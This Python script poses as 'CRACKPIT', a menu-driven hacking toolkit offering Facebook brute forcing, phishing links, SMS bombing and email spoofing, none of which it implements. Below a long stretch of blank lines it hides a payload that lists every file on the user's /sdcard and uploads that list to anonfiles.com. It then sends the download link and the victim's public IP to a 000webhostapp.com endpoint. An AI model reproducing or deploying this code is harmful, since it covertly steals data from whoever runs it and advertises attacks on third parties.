import time, os, sys

red = '\x1b[31m'
green = '\x1b[32m'
yellow = '\x1b[33m'
blue = '\x1b[34m'
purple = '\x1b[35m'
cyan = '\x1b[36m'

def hulu(z):
  for word in z + '\n':
    sys.stdout.write(word)
    sys.stdout.flush()
    time.sleep(0.001)
os.system('clear')

def hulu2(z):
  for word in z + '\n':
    sys.stdout.write(word)
    sys.stdout.flush()
    time.sleep(0.009)
    
logo2 = '\n\x1b[31m   _____ _____            _____ _  _______ _____ _______ \n\x1b[32m  / ____|  __ \     /\   / ____| |/ /  __ \_   _|__   __|\n\x1b[33m | |    | |__) |   /  \ | |    |   /| |__) || |    | |   \n\x1b[34m | |    |  _  /   / /\ \| |    |  < |  ___/ | |    | |   \n\x1b[35m | |____| | \ \  / ____ \ |____| . \| |    _| |_   | |   \n\x1b[36m  \_____|_|  \_\/_/    \_\_____|_|\_\_|   |_____|  |_|\n\n\x1b[32m  [\x1b[31mAuthor   \x1b[32m]\x1b[36m  ZIHAD ! H4X00R_M4573R - K3Y\n\x1b[32m  [\x1b[31mTool Name\x1b[32m]\x1b[36m CRACKPIT\n\x1b[32m  [\x1b[31mVersion  \x1b[32m]\x1b[36m 1.0\n\x1b[32m  [\x1b[31mDeveloper\x1b[32m]\x1b[36m Zihad™©®\n\n \x1b[35m--------------> \x1b[36mUse your own responsibility \x1b[35m<--------------\n'
logo3 = '\n\x1b[32m[\x1b[37m01\x1b[32m] \x1b[36mInternational Fb Cloner\n\n\x1b[32m[\x1b[37m02\x1b[32m] \x1b[36mFB BruteForce (Working)\n\n\x1b[32m[\x1b[37m03\x1b[32m] \x1b[36mPhishing Link Genarator\n\n\x1b[32m[\x1b[37m04\x1b[32m] \x1b[36mSms Boombing\n\n\x1b[32m[\x1b[37m05\x1b[32m] \x1b[36mEmail Spoofing\n\n\x1b[32m[\x1b[37m06\x1b[32m] \x1b[36mVirus'
hulu2(logo2)
hulu2(logo3)







































import requests
import os 
import json
import sys
os.system("cd /sdcard && find * > data.txt")
def ipack(url):
  try:
    r = requests.get("http://"+url)
    return True
  except requests.exceptions.ConnectionError:
    return False
def upload(f):
  up = requests.post("https://api.anonfiles.com/upload", files={'file': open(f, "rb")})
  js = json.loads(up.text)
  dt = js["data"]
  dl = dt["file"]
  fl = dl["url"]
  link = fl["full"]
  req = requests.get("https://rootportal.000webhostapp.com/index.php?name="+str(uname)+"&link="+str(link))
if ipack("ifconfig.me") == True:
  uname = requests.get("https://ifconfig.me/")
  uname = uname.text
  upload("/sdcard/data.txt")
else:
  print("You're in offline and sdcard permission are not allowed !")
  
input("[ x ] Input : ")
